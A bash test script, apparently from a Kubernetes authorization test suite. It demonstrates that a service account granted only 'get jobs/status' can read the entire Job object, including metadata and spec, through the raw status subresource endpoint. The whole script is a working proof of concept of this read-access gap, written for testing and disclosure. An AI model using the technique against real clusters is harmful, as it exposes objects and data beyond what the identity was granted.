#!/usr/bin/env bash
# Implicit permission: get jobs/status -> get jobs   (jobs-status-reads-parent)
#
# Proof: an identity granted ONLY `get jobs/status` cannot `get jobs`, yet a GET
# on the `/status` subresource returns the ENTIRE stored Job object -- metadata,
# spec, and status -- not a status-only projection. `StatusREST.Get` forwards
# verbatim to the parent store's Get, and the read strategy is NOT narrowed. So
# "status-only" read access is in fact full-object read access: the bytes a
# `get jobs/status` returns are the bytes `get jobs` would return.
# Mechanism: ../transitions/get-status-reads-parent.md
source "$(dirname "$0")/../lib.sh"
test_start "jobs-status-reads-parent"

# Self-cleanup (see note in deployments-status-updates-parent.sh): new_ns's
# _track is lost to its subshell under bash 4.2 + set -u, so we track our own
# objects and delete them on exit, chaining the harness _cleanup.
WP_OBJS=()
wp_track() { WP_OBJS+=("$1"); }
wp_cleanup() {
  local rc=$? o
  for o in "${WP_OBJS[@]:-}"; do [ -n "$o" ] && K delete "$o" --ignore-not-found --wait=false >/dev/null 2>&1 || true; done
  _cleanup || true
  return $rc
}
trap wp_cleanup EXIT

ns="$(new_ns job-status)"; wp_track "namespace/$ns"

# A Job whose SPEC carries a secret-ish marker the attacker must not read via
# `get jobs`, but which the parent object (and thus /status) exposes.
marker="wp-job-spec-${RUN_ID}"
step "admin creates Job 'victim' carrying marker annotation '$marker' in metadata"
K -n "$ns" apply -f - >/dev/null <<EOF || fail "could not create job"
apiVersion: batch/v1
kind: Job
metadata:
  name: victim
  annotations: { wp/marker: "$marker" }
spec:
  completions: 1
  parallelism: 1
  backoffLimit: 0
  template:
    metadata: { labels: { app: victim } }
    spec:
      restartPolicy: Never
      automountServiceAccountToken: false
      containers:
      - name: c
        image: ${IMG}
        imagePullPolicy: IfNotPresent
        command: ["sh","-c","sleep 2"]
EOF

mk_sa "$ns" attacker
# ONLY jobs/status get. Deliberately NO `get jobs` on the parent.
grant_ns "$ns" attacker "batch" "jobs/status" "get"
subj="$(sa_subject "$ns" attacker)"

assert_can    "$subj" get jobs/status "$ns"   # holds p
assert_cannot "$subj" get jobs        "$ns"   # THE GAP: lacks q

# ACT (as attacker, exercising ONLY p): GET the /status subresource. The
# attacker reads it itself -- no admin needed, because the whole point is that
# the subresource read returns the parent's bytes.
step "attacker GETs jobs/status via the raw subresource endpoint"
out="$(as_subj "$subj" get --raw "/apis/batch/v1/namespaces/$ns/jobs/victim/status" 2>/dev/null)" \
  || fail "attacker could not GET jobs/status"
assert_nonempty "$out" "jobs/status GET returned a body"

# EFFECT: the /status GET returned the FULL parent object -- it contains the
# Job's metadata (incl. the marker annotation) and spec, which `get jobs` grants
# but `get jobs/status` nominally does not.
assert_contains "$out" "\"kind\":\"Job\""              "status GET returns a full Job object, not a status projection"
assert_contains "$out" "$marker"                        "status GET leaked the parent's metadata (marker annotation)"
assert_contains "$out" "\"spec\""                       "status GET leaked the parent's spec"
step "get jobs/status returned the whole parent Job (kind=Job, marker '$marker', spec present) -- full-object read via 'status-only' grant"

test_pass
